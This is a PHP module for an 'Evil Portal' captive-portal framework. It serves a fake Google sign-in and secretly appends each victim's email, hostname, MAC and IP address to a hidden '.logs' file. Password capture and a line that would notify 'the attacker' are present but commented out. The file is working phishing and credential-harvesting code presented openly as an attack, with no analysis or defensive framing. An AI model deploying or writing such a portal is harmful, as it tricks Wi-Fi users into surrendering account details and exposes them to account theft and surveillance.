<?php namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorizationGoogle()
    {
        if (isset($_POST['email'])) {
            $email = isset($_POST['email']) ? $_POST['email'] : 'email';
            //$pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
            $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
            $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
            $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';

            $reflector = new \ReflectionClass(get_class($this));
            $logPath = dirname($reflector->getFileName());
            
            // Log all the collected information into a file named .logs
            file_put_contents(
                "{$logPath}/.logs",
                "[" . date('Y-m-d H:i:s') . "Z]\n" .
                //"email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\n" .
                "email: {$email}\nhostname: {$hostname}\n" .
                "mac: {$mac}\n" .
                "ip: {$ip}\n\n",
                FILE_APPEND
            );
            
            // In a real scenario, this would notify the attacker of the collected credentials.
            // $this->execBackground("notify $email' - '$pwd");
        }
        
        // This is a crucial line. After logging the data, we call the parent method
        // to handle the rest of the authorization, in this case, it will allow
        // the index.php script to proceed with the redirection.
        parent::handleAuthorization();
    }

    public function onSuccess()
    {
        parent::onSuccess();
    }

    public function showError()
    {
        parent::showError();
    }
}
